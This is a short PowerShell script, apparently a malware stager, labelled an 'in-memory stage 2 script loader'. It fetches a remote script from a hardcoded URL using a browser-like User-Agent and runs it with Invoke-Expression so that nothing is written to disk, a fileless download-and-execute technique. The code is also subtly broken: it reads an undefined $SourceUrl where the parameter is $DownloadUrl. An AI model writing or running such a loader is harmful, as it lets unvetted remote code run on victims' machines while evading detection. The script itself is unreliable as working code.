<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.
#>
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'http://internal.corp/stage2.ps1',
    [int]$RequestTimeout = 153
)
$ErrorActionPreference = "Stop"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $PayloadText = $ClientObject.DownloadString($SourceUrl)
    if ([string]::IsNullOrWhiteSpace($PayloadText)) {
        throw "Downloaded script was empty"
    }
    Write-Verbose ("Script length: " + $PayloadText.Length)
    Invoke-Expression $PayloadText
}
catch {
    Write-Warning "In-memory stage failed: $($_.Exception.Message)"
}

Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$StageMarker = "stage-21"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
